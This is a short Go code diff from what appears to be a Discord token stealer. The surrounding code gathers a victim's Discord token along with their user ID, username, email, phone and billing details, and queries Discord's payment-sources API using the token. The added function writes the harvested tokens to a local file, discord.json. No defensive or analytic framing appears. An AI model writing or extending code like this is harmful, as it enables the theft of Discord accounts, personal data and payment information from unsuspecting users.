@@ -202,6 +202,10 @@ func GetTokenInfo(token string) Tokens {
 	return Tokens{TOKEN: token, ID: user_id, USERNAME: username, EMAIL: email, PHONE: phone, BILLING: billing}
 }
 
+func WriteDiscordInfo() {
+	os.WriteFile("discord.json", []byte(GetTokens()), 0644)
+}
+
 func getBilling(token string) string {
 	client := http.Client{}
 	url := "https://discord.com/api/v6/users/@me/billing/payment-sources"
